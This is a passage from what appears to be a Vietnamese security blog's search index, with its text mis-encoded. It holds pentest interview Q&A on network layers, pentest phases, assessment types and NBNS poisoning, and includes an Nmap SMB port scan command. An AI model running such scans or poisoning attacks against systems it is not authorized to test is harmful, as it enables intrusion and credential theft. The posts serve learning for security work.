thi·∫øu, nh∆∞ng b√π l·∫°i r·∫•t nhanh.     Network Layer: T·∫°i ƒë√¢y c√°c Segment s·∫Ω ƒë∆∞·ª£c g·∫Øn th√™m m·ªôt header g·ªçi l√† IP Header bao g·ªìm 2 th√¥ng tin ch√≠nh l√† Source IP v√† Destination IP. C·ª• th·ªÉ th√¨ Source IP l√† ƒë·ªãa ch·ªâ IP c·ªßa Client v√† Destination IP l√† ƒë·ªãa ch·ªâ IP c·ªßa Server. C√°c g√≥i tin b√¢y gi·ªù s·∫Ω ƒë∆∞·ª£c g·ªçi l√† Datagram.  Source IP s·∫Ω ƒë∆∞·ª£c l·∫•y t·ª´ DHCP Server ho·∫∑c ng∆∞·ªùi d√πng c√≥ th·ªÉ t·ª± thi·∫øt l·∫≠p b·∫±ng tay. C√≤n v·ªõi Destination IP th√¨ ƒë∆∞·ª£c x√°c ƒë·ªãnh qua giao th·ª©c DNS. V√≠ d·ª• nh∆∞ http://google.com s·∫Ω ƒë∆∞·ª£c d·ªãch ra ƒë·ªãa ch·ªâ IP s·∫Ω l√† 172.217.161.142.   Datalink v√† Physical: ƒê·ªÉ m·ªôt g√≥i tin t·ªõi ƒë√≠ch, ch√∫ng ta c·∫ßn th√™m 1 lo·∫°i ƒë·ªãa ch·ªâ n·ªØa ƒë√≥ l√† ƒë·ªãa ch·ªâ MAC hay c√≤n ƒë∆∞·ª£c g·ªçi l√† ƒë·ªãa ch·ªâ v·∫≠t l√Ω. ƒê·ªãa ch·ªâ n√†y l√† ƒë·ªôc nh·∫•t tr√™n m·ªçi thi·∫øt b·ªã. M·ªôt header ƒë∆∞·ª£c th√™m v√†o Datagram bao g·ªìm Source MAC v√† Destination MAC. C√°c g√≥i tin b√¢y gi·ªù ƒë∆∞·ª£c g·ªçi l√† c√°c Frame.  Source MAC s·∫Ω l√† ƒë·ªãa ch·ªâ MAC c·ªßa m√°y g·ª≠i, c√≤n Destination MAC s·∫Ω l√† c·ªßa m√°y nh·∫≠n. C√≥ m·ªôt tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra. N·∫øu kh√¥ng t√¨m th·∫•y Destination MAC t∆∞∆°ng ·ª©ng v·ªõi Destination IP, m√°y t√≠nh s·∫Ω s·ª≠ d·ª•ng giao th·ª©c ARP. ARP Request ƒë√≠nh k√®m Destination IP s·∫Ω ƒë∆∞·ª£c g·ª≠i Broadcast t·ªõi t·∫•t c√°c c√°c m√°y trong m·∫°ng c√≥ ch·ª©a m√°y ngu·ªìn.  N·∫øu Destination IP l√† ƒë·ªãa ch·ªâ IP c·ª•c b·ªô c·ªßa m·∫°ng ƒë√≥, m√°y t√≠nh mang ƒë·ªãa ch·ªâ IP n√†y s·∫Ω tr·∫£ l·ªùi v·ªõi ƒë·ªãa ch·ªâ MAC c·ªßa n√≥ v·ªÅ cho m√°y g·ª≠i ARP Request. V·∫≠y Destination MAC ·ªü ƒë√¢y ch√≠nh l√† ƒë·ªãa ch·ªâ MAC c·ªßa m√°y t√≠nh c√πng m·∫°ng v·ªõi m√°y g·ª≠i. N·∫øu Destination IP l√† ƒë·ªãa ch·ªâ IP c·ªßa m·∫°ng kh√°c, Router ch·ª©a m·∫°ng n√†y s·∫Ω ph√°t hi·ªán ra ƒëi·ªÅu ƒë√≥ v√† tr·∫£ l·ªùi v·ªõi ƒë·ªãa ch·ªâ MAC c·ªßa router n√™n Destination MAC ·ªü ƒë√¢y s·∫Ω l√† ƒë·ªãa ch·ªâ MAC c·ªßa router. N·∫øu Destination IP l√† ƒë·ªãa ch·ªâ IP c·ªßa m·∫°ng kh√°c v√† ƒë·ªãa ch·ªâ Default Gateway c≈©ng nh∆∞ Subnetmask ƒë√£ ƒë∆∞·ª£c ƒë·∫∑t, m√°y t√≠nh s·∫Ω s·ª≠ d·ª•ng th√¥ng tin n√†y ƒë·ªÉ x√°c ƒë·ªãnh ƒë∆∞·ª£c Gateway v√† g·ª≠i g√≥i tin ƒë·∫øn ƒë√¢y. Destination MAC ·ªü ƒë√¢y s·∫Ω l√† ƒë·ªãa ch·ªâ c·ªßa Gateway, th∆∞·ªùng s·∫Ω l√† m·ªôt router.   Sau khi x√°c ƒë·ªãnh ƒë·∫ßy ƒë·ªß ƒë·ªãa ch·ªâ Source MAC v√† Destination MAC, c√°c Frame b√¢y gi·ªù s·∫Ω ƒë∆∞·ª£c ƒë∆∞a xu·ªëng l·ªõp Physical, ƒë∆∞·ª£c m√£ h√≥a v√† chuy·ªÉn ƒë·ªïi th√†nh c√°c t√≠n hi·ªáu v·∫≠t l√Ω th√≠ch h·ª£p, ƒë·ªÉ ƒë∆∞a l√™n ƒë∆∞·ªùng truy·ªÅn.       H·ªèi: Construct an Nmap SYN scan that does not do DNS lookups, does not ping the host, and only returns open ports for tcp/139 and tcp/445 Tr·∫£ l·ªùi:  Tr√™n nmap c√≥ 1 t√πy ch·ªçn l√† -Pn (kh√¥ng ping). B·∫°n ƒë·ªçc c√≥ th·ªÉ s·ª≠ d·ª•ng t√πy ch·ªçn n√†y, do t√πy ch·ªçn n√†y b·ªè qua giai ƒëo·∫°n kh√°m ph√° Nmap ho√†n to√†n. Th√¥ng th∆∞·ªùng th√¨ Nmap s·ª≠ d·ª•ng giai ƒëo·∫°n n√†y ƒë·ªÉ x√°c ƒë·ªãnh c√°c m√°y ho·∫°t ƒë·ªông trong m·∫°ng ƒë·ªÉ qu√©t s√¢u h∆°n. Theo m·∫∑c ƒë·ªãnh, Nmap ch·ªâ th·ª±c hi·ªán c√°c ho·∫°t ƒë·ªông thƒÉm d√≤ s√¢u nh∆∞ qu√©t c·ªïng, ph√°t hi·ªán phi√™n b·∫£n hay h·ªá ƒëi·ªÅu h√†nh v·ªõi c√°c m√°y ch·ªß ƒë∆∞·ª£c t√¨m th·∫•y. Ch·ªâ ƒë·ªãnh qu√©t c·ªïng c·ªë ƒë·ªãnh, ·ªü ƒë√¢y l√† port 139 v√† 445, ta c√≥ th·ªÉ s·ª≠ d·ª•ng t√πy ch·ªçn -p c·ªßa Nmap. V·∫≠y c√¥ng th·ª©c ƒë·∫ßy ƒë·ªß s·∫Ω l√† nmap -Pn -p 139,445 \u0026lt;target\u0026gt;. Ch√∫c c√°c b·∫°n th√†nh c√¥ng :D.   B·∫°n ƒë·ªçc c√≥ th·ªÉ ƒë·ªçc ph·∫ßn 1 t·∫°i ƒë√¢y: T·ªïng h·ª£p c√°c c√¢u h·ªèi ph·ªèng v·∫•n pentest - ki·∫øn th·ª©c chung (P1) \n ","permalink":"https://minhtuanact.ml/posts/tong-hop-cac-cau-hoi-phong-van-pentest-kien-thuc-chung-p2/","summary":"H·ªèi: Answer true or false and explain your answer: two-factor authentication protects against session hijacking? Tr·∫£ l·ªùi:  V·ªÅ c√¢u tr·∫£ l·ªùi n√†y, m√¨nh v·∫´n ch∆∞a bi·∫øt n√™n tr·∫£ l·ªùi l√† ƒë√∫ng hay sai. C√≥ 2 tr∆∞·ªùng h·ª£p x·∫£y ra ·ªü ƒë√¢y:  Tr∆∞·ªõc khi b·∫°n nh·∫≠p m√£ x√°c minh g·ª≠i ƒë·∫øn ƒëi·ªán tho·∫°i hay ·ª©ng d·ª•ng hay ƒë·∫°i lo·∫°i l√† 1 m√£ OTP n√†o ƒë√≥ m√† b√™n Server g·ª≠i cho b·∫°n ƒë·ªÉ x√°c minh ƒë√≥ ƒë√∫ng l√† b·∫°n ƒëƒÉng nh·∫≠p v√†o t√†i kho·∫£n c·ªßa b·∫°n.","title":"T·ªïng h·ª£p c√°c c√¢u h·ªèi ph·ªèng v·∫•n pentest - ki·∫øn th·ª©c chung (P2)"},{"content":"H·ªèi: What are the phases of a penetration test? Tr·∫£ l·ªùi: Th√¥ng th∆∞·ªùng, pentest ƒë∆∞·ª£c chia ra l√†m 6 giai ƒëo·∫°n S√°u giai ƒëo·∫°n n√†y r·∫•t quan tr·ªçng ƒë·ªÉ l·∫≠p k·∫ø ho·∫°ch v√† th·ª±c hi·ªán th√†nh c√¥ng b√†i pentest. ƒê·ªëi v·ªõi pentest th√¨ c√≥ r·∫•t nhi·ªÅu m·∫£ng pentest nh∆∞ Pentest Website, Pentest Network, Pentest Server. Nh∆∞ng nh√¨n chung th√¨ Pentest c√≥ c√°c giai ƒëo·∫°n nh∆∞ sau:\n Pre-Engagement Interactions  ƒê√¢y l√† b∆∞·ªõc th·ªëng nh·∫•t c√°c y√™u c·∫ßu c·ªßa b√™n c·∫ßn pentest v√† c√°c chi·∫øn l∆∞·ª£c m√† b√™n th·ª±c hi·ªán pentest ƒë·ªÅ ra.   Reconnaissance or Open Source Intelligence (OSINT) Gathering  M·ªôt ng∆∞·ªùi pentest s·∫Ω ho·∫°t ƒë·ªông tr√™n vi·ªác thu th·∫≠p c√†ng nhi·ªÅu th√¥ng tin m·∫≠t v·ªÅ t·ªï ch·ª©c c·ªßa b·∫°n v√† c√°c m·ª•c ti√™u ti·ªÅm nƒÉng ƒë·ªÉ khai th√°c. T√πy thu·ªôc v√†o m·ª©c ƒë·ªô pentest m√† ng∆∞·ªùi pentest s·∫Ω c√≥ m·ª©c ƒë·ªô th√¥ng tin v·ªÅ t·ªï ch·ª©c c·ªßa b·∫°n ƒë·ªÉ c·∫ßn kh√°m ph√° c√°c l·ªó h·ªïng v√† ƒëi·ªÉm v√†o trong m√¥i tr∆∞·ªùng c·ªßa b·∫°n.   Threat Modeling \u0026amp; Vulnerability Identification  Trong giai ƒëo·∫°n n√†y ng∆∞·ªùi th·ª±c hi·ªán pentest s·∫Ω x√°c ƒë·ªãnh m·ª•c ti√™u t·∫•n c√¥ng. B·∫•t k·ª≥ th√¥ng tin n√†o ƒë∆∞·ª£c thu th·∫≠p trong giai ƒëo·∫°n n√†y s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ th√¥ng b√°o ph∆∞∆°ng th·ª©c t·∫•n c√¥ng trong qu√° tr√¨nh pentest   Exploitation  V·ªõi m√¥ h√¨nh v·ªÅ t·∫•t c·∫£ c√°c l·ªó h·ªïng v√† c√°c ƒëi·ªÉm truy c·∫≠p c√≥ th·ªÉ c√≥, ng∆∞·ªùi pentest b·∫Øt ƒë·∫ßu ki·ªÉm tra c√°c khai th√°c ƒë∆∞·ª£c t√¨m th·∫•y trong m·∫°ng, h·ªá th·ªëng hay ·ª©ng d·ª•ng c·ªßa b·∫°n. X√°c ƒë·ªãnh c√°c m·ª•c ti√™u c√≥ gi√° tr·ªã cao v√† tr√°nh m·ªçi ph√°t hi·ªán c·ªßa hacker.   Post-Exploitation, Risk Analysis \u0026amp; Recommendations  Sau giai ƒëo·∫°n th·ª© t∆∞ ho√†n t·∫•t, ng∆∞·ªùi pentest s·∫Ω ghi l·∫°i c√°c ph∆∞∆°ng th·ª©c ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ c√≥ quy·ªÅn truy c·∫≠p v√†o th√¥ng tin c√≥ gi√° tr·ªã c·ªßa t·ªï ch·ª©c c·ªßa b·∫°n v√† ƒë·ªÅ xu·∫•t c√°c ph∆∞∆°ng ph√°p kh·∫Øc ph·ª•c c√°c l·ªó h·ªïng. Sau khi pentest k·∫øt th√∫c, ng∆∞·ªùi pentest n√™n d·ªçn s·∫°ch m√¥i tr∆∞·ªùng, c·∫•u h√¨nh l·∫°i m·ªçi quy·ªÅn m√† anh ta/c√¥ ta c√≥ ƒë∆∞·ª£c ƒë·ªÉ x√¢m nh·∫≠p v√†o m√¥i tr∆∞·ªùng v√† ngƒÉn ch·∫∑n truy c·∫≠p tr√°i ph√©p v√†o h·ªá th·ªëng.   Reporting  B√°o c√°o ƒë∆∞·ª£c coi l√† kh√≠a c·∫°nh quan tr·ªçng nh·∫•t c·ªßa m·ªôt pentester. ƒê√≥ l√† n∆°i b·∫°n s·∫Ω nh·∫≠n ƒë∆∞·ª£c c√°c ƒë·ªÅ xu·∫•t b·∫±ng vƒÉn b·∫£n v√† c√≥ c∆° h·ªôi xem x√©t c√°c ph√°t hi·ªán t·ª´ b√°o c√°o v·ªõi c√°c ethical hacker. Nh·ªØng ph√°t hi·ªán v√† gi·∫£i th√≠ch chi ti·∫øt t·ª´ b√°o c√°o s·∫Ω cung c·∫•p cho b·∫°n nh·ªØng hi·ªÉu bi·∫øt v√† c∆° h·ªôi ƒë·ªÉ c·∫£i thi·ªán kh·∫£ nƒÉng b·∫£o m·∫≠t c·ªßa b·∫°n. B√°o c√°o s·∫Ω cho th·∫•y nh·ªØng l·ªó h·ªïng c√≤n t·ªìn t·∫°i v√† c√°c c√°ch kh·∫Øc ph·ª•c c√°c v·∫•n ƒë·ªÅ n√†y ƒë∆∞·ªùng t√¨m th·∫•y trong giai ƒëo·∫°n khai th√°c.     H·ªèi: What is the difference between a risk assessment, a vulnerability assessment, and a penetration test? Tr·∫£ l·ªùi:  ƒê·∫ßu ti√™n ta s·∫Ω ph·∫£i t√¨m hi·ªÉu nh∆∞ th·∫ø n√†o l√† ƒë√°nh gi√° r·ªßi ro, ƒë√°nh gi√° l·ªó h·ªïng v√† ki·ªÉm th·ª≠ ph·∫ßn m·ªÅm l√† g√¨.  ƒê√°nh gi√° r·ªßi ro ‚Äì Risk Assessment: Ki·ªÉm th·ª≠ n√†y li√™n quan ƒë·∫øn ph√¢n t√≠ch c√°c r·ªßi ro b·∫£o m·∫≠t nh·∫≠n th·∫•y ƒë∆∞·ª£c. C√°c r·ªßi ro ƒë∆∞·ª£c ph√¢n lo·∫°i l√† Low, Medium, High. Lo·∫°i ki·ªÉm th·ª≠ n√†y ƒë∆∞a ra c√°c khuy·∫øn ngh·ªã nh·∫±m gi·∫£m thi·ªÉu c√°c r·ªßi ro. ƒê√°nh gi√° b·∫£o m·∫≠t b·∫±ng c√°ch t·∫•n c√¥ng v√†o h·ªá th·ªëng ‚Äì Penetration testing: ƒê√¢y l√† lo·∫°i ki·ªÉm th·ª≠ m√¥ ph·ªèng cu·ªôc t·∫•n c√¥ng t·ª´ ph√≠a m·ªôt hacker thi·∫øu thi·ªán √Ω. Ki·ªÉm th·ª≠ bao g·ªìm vi·ªác ph√¢n t√≠ch m·ªôt h·ªá th·ªëng c·ª• th·ªÉ, t√¨m ra c√°c l·ªó h·ªïng ti·ªÅm ·∫©n b·∫±ng c√°ch t·∫•n c√¥ng t·ª´ b√™n ngo√†i. R√† so√°t c√°c l·ªó h·ªïng ti·ªÅm ·∫©n ‚Äì Vulnerable Assessment: th·ª±c hi·ªán th√¥ng qua c√°c ph·∫ßn m·ªÅm ƒë·ªÉ t·ª± ƒë·ªông scan m·ªôt h·ªá th·ªëng nh·∫±m ph√°t hi·ªán ra c√°c l·ªó h·ªïng d·ª±a tr√™n c√°c signatures ƒë√£ bi·∫øt.   V·∫≠y s·ª± kh√°c bi·ªát c·ªßa nh·ªØng th·ª© n√†y l√† g√¨:  Vulneraability Assessment: C·ªë g·∫Øng t√¨m ƒë∆∞·ª£c c√†ng nhi·ªÅu c√°c l·ªó h·ªïng nh·∫•t c√≥ th·ªÉ. Penetration Testing (Pentest): C·ªë g·∫Øng ph√° v·ª° an ninh h·ªá th·ªëng. Risk Assessment: C·ªë g·∫Øng t√¨m ra nh·ªØng r·ªßi ro c√≥ th·ªÉ c√≥.    =\u0026gt; C·∫£ 3 ph∆∞∆°ng ph√°p ƒë·ªÅu c√≥ ch·ª©c nƒÉng v√† c√°ch ti·∫øp c·∫≠n kh√°c nhau. Ch√≠nh v√¨ v·∫≠y t√πy thu·ªôc v√†o t√¨nh tr·∫°ng an ninh c·ªßa h·ªá th·ªëng m√† ng∆∞·ªùi ta l·ª±a ch·ªçn ph∆∞∆°ng ph√°p n√†o ƒë·ªÉ √°p d·ª•ng.\n Vulneraability Assessment: Nh·∫≠n d·∫°ng ƒë∆∞·ª£c nh·ªØng ƒëi·ªÉm y·∫øu v√† ƒë∆∞a ra ƒë∆∞·ª£c nh·ªØng gi·∫£i ph√°p ƒë·ªÉ s·ª≠a ch·ªØa ch√∫ng. Penetration Testing (Pentest): Tr·∫£ l·ªùi ƒë∆∞·ª£c c√¢u h·ªèi: \u0026ldquo;Li·ªáu c√≥ ai c√≥ th·ªÉ ph√° v·ª° an ninh c·ªßa h·ªá th·ªëng kh√¥ng, v√† n·∫øu c√≥ th√¨ g√¢y ra ƒë∆∞·ª£c t√°c h·∫°i g√¨\u0026rdquo;. Risk Assessment: X√°c ƒë·ªãnh ƒë∆∞·ª£c nh·ªØng r·ªßi ro ti·ªÅm ·∫©n v√† ƒë√°nh gi√° ƒë∆∞·ª£c nh·ªØng r·ªßi ro cho h√†nh ƒë·ªông, c√¥ng vi·ªác m√† ch√∫ng ta chu·∫©n b·ªã ti·∫øn h√†nh.   H·ªèi: Explain what NBNS poisoning is and how it can be leveraged on a penetration test. Tr·∫£ l·ªùi:  ƒê·∫ßu ti√™n ph·∫£i n√≥i v·ªÅ NBNS l√† g√¨  NBNS (NetBIOS Name Service) l√† m·ªôt giao th·ª©c m·∫°ng ƒë∆∞·ª£c t·∫°o ra cho c√°c h·ªá th·ªëng c≈© ƒë·ªÉ cho ph√©p giao ti·∫øp qua c√°c m·∫°ng TCP/IP hi·ªán ƒë·∫°i. Trong nhi·ªÅu tr∆∞·ªùng h·ª£p NBNS v·∫´n ƒë∆∞·ª£c s·ª≠ d·ª•ng trong m·ªôt s·ªë t·ªï ch·ª©c ng√†y nay, vi·ªác v√¥ hi·ªáu h√≥a n√≥ c√≥ th·ªÉ g√¢y ra s·ª± gi√°n ƒëo·∫°n d·ªãch v·ª•. N√≥ c√≥ nhi·ªÅu ch·ª©c nƒÉng gi·ªëng nh∆∞ DNS cho ph√©p c√°c h·ªá th·ªëng k·∫ø th·ª´a v√† ph√¢n gi·∫£i DNS th√†nh ƒë·ªãa ch·ªâ IP.   V·∫≠y NBNS poisoning l√† g√¨  V·ªÅ c∆° b·∫£n, khi m·ªôt h·ªá th·ªëng c√≥ NBNS ƒë∆∞·ª£c k√≠ch ho·∫°t s·∫Ω c·ªë g·∫Øng ph√¢n gi·∫£i t√™n DNS th√†nh ƒë·ªãa ch·ªâ IP c·ªßa n√≥, c√°c quy tr√¨nh sau s·∫Ω ƒë∆∞·ª£c ch·∫°y:  H·ªá th·ªëng ki·ªÉm tra t·ªáp localhost c·ªßa n√≥ ƒë·ªÉ t√¨m DNS tƒ©nh ƒë·∫øn c√°c √°nh x·∫° ƒë·ªãa ch·ªâ IP. N·∫øu t·∫≠p tin tr√™n host kh√¥ng c√≥ entry, th√¨ h·ªá th·ªëng y√™u c·∫ßu c√°c m√°y ch·ªß DNS c·ªßa m√¨nh gi·∫£i quy·∫øt c√°c t√™n DNS. N·∫øu t√™n DNS kh√¥ng ch·ª©a √°nh x·∫° ƒë·ªãa ch·ªâ DNS sang IP th√¨ h·ªá th·ªëng s·∫Ω g·ª≠i truy v·∫•n broadcast NBNS ƒë·ªÉ y√™u c·∫ßu c√°c h·ªá th·ªëng kh√°c h·ªó tr·ª£.   Attacker s·∫Ω b·∫±ng c√°ch l·∫Øng nghe l∆∞u l∆∞·ª£ng m·∫°ng tr√™n m·∫°ng c·ªßa b·∫°n v√† ch·ªù ƒë·ª£i c√°c truy v·∫•n n√†y xu·∫•t hi·ªán. Sau khi ƒë∆∞·ª£c ph√°t hi·ªán, attacker tr·∫£ l·ªùi h·ªá th·ªëng t√¨m ki·∫øm s·ª± h·ªó tr·ª£ v√† m·∫°o danh t√™n DNS ƒë∆∞·ª£c ƒë·ªÅ c·∫≠p ƒë·∫øn. V√¨ v·∫≠y, v√≠ d·ª• n·∫øu h·ªá th·ªëng A ƒëang c·ªë g·∫Øng gi·∫£i quy·∫øt goog.com, attacker tr·∫£ l·ªùi ƒë·∫øn broadcast ƒë√≥ v√† n√≥i \u0026ldquo;I am goo.com\u0026rdquo;. Tuy thu·ªôc v√†o vi·ªác h·ªá th·ªëng A ƒëang c·ªë x√°c th·ª±c th√¥ng qua SMB, FTP, v.v.., l∆∞u l∆∞·ª£ng ƒë√≥ s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒë·∫øn attacker (v√¨ n√≥ cho r·∫±ng ƒë√≥ l√† h·ªá th·ªëng h·ª£p ph√°p) Trong h·∫ßu h·∫øt c√°c m√¥i tr∆∞·ªùng, khi c√°c cu·ªôc t·∫•n c√¥ng n√†y x·∫£y ra, attacker ƒë√£ chi·∫øm ƒë∆∞·ª£c th√¥ng tin ng∆∞·ªùi d√πng ·ªü d·∫°ng bƒÉm. Trong m·ªôt s·ªë tr∆∞·ªùng h·ª£p kh√°c, th√¥ng tin vƒÉn b·∫£n ƒë∆∞·ª£c truy·ªÅn ƒëi ·ªü b·∫£n r√µ v√† c√≥ th·ªÉ xem ƒë∆∞·ª£c c√°c th√¥ng tin th√¥ng qua qu√° tr√¨nh n√†y. Khi attacker ƒë√£ bƒÉm th√¥ng tin ƒëƒÉng nh·∫≠p c·ªßa ng∆∞·ªùi d√πng, h·ªç c√≥ th·ªÉ th·ª±c hi·ªán c√°c cu·ªôc t·∫•n c√¥ng t·ª´ ƒëi·ªÉn v√† t·ª´ ƒëi·ªÉn ngo·∫°i tuy·∫øn ƒë·ªÉ c·ªë g·∫Øng ti·ªát l·ªô m·∫≠t kh·∫©u ·ªü b·∫£n r√µ.     Nh∆∞ v·∫≠y, ta c√≥ th·ªÉ t·∫≠n d·ª•ng NBNS poisoning v√†o b√†i pentest ƒë·ªÉ th·ª±c hi·ªán m·ªôt cu·ªôc t·∫•n c√¥ng Man-in-the-middle l√† m·ªôt chi·∫øn thu·∫≠t ph·ªï bi·∫øn ƒë√£ ƒë∆∞·ª£c s·ª≠ d·ª•ng r·ªông r√£i b·ªüi nh·ªØng pentester. C√°c b·∫£n bƒÉm m·∫≠t kh·∫©u ƒë∆∞·ª£c truy xu·∫•t c√≥ th·ªÉ b·ªã b·∫ª kh√≥a b·∫±ng t·ª≠ ƒëi·ªÉn ngo·∫°i tuy·∫øn ho·∫∑c c√≥ th·ªÉ s·ª≠ d·ª•ng c√πng v·ªõi cu·ªôc t·∫•n c√¥ng chuy·ªÉn ti·∫øp ƒë·ªÉ ƒë·∫°t ƒë∆∞·ª£c quy·ªÅn truy c·∫≠p h·ª£p ph√°p v√†o m√°y ch·ªß.\n  B·∫°n ƒë·ªçc c√≥ th·ªÉ ƒë·ªçc ti·∫øp ph·∫ßn 2 t·∫°i ƒë√¢y: T·ªïng h·ª£p c√°c c√¢u h·ªèi ph·ªèng v·∫•n pentest - ki·∫øn th·ª©c chung (P2) \n","permalink":"https://minhtuanact.ml/posts/tong-hop-cac-cau-hoi-phong-van-pentest-kien-thuc-chung-p1/","summary":"H·ªèi: What are the phases of a penetration test? Tr·∫£ l·ªùi: Th√¥ng th∆∞·ªùng, pentest ƒë∆∞·ª£c chia ra l√†m 6 giai ƒëo·∫°n S√°u giai ƒëo·∫°n n√†y r·∫•t quan tr·ªçng ƒë·ªÉ l·∫≠p k·∫ø ho·∫°ch v√† th·ª±c hi·ªán th√†nh c√¥ng b√†i pentest. ƒê·ªëi v·ªõi pentest th√¨ c√≥ r·∫•t nhi·ªÅu m·∫£ng pentest nh∆∞ Pentest Website, Pentest Network, Pentest Server. Nh∆∞ng nh√¨n chung th√¨ Pentest c√≥ c√°c giai ƒëo·∫°n nh∆∞ sau:\n Pre-Engagement Interactions  ƒê√¢y l√† b∆∞·ªõc th·ªëng nh·∫•t c√°c y√™u c·∫ßu c·ªßa b√™n c·∫ßn pentest v√† c√°c chi·∫øn l∆∞·ª£c m√† b√™n th·ª±c hi·ªán pentest ƒë·ªÅ ra.","title":"T·ªïng h·ª£p c√°c c√¢u h·ªèi ph·ªèng v·∫•n pentest - ki·∫øn th·ª©c chung (P1)"},{"content":"Nguy Minh Tuan (Mr.)\nCyber Security Research Team - R\u0026amp;D Unit - Sun* Inc.\nViblo: https://viblo.asia/u/minhtuan.nguy\nBugcrowd: https://bugcrowd.com/minhtuanact\nEmail: minhtuanact[at]gmail[dot]com\n","permalink":"https://minhtuanact.ml/about/","summary":"about","title":"About"}]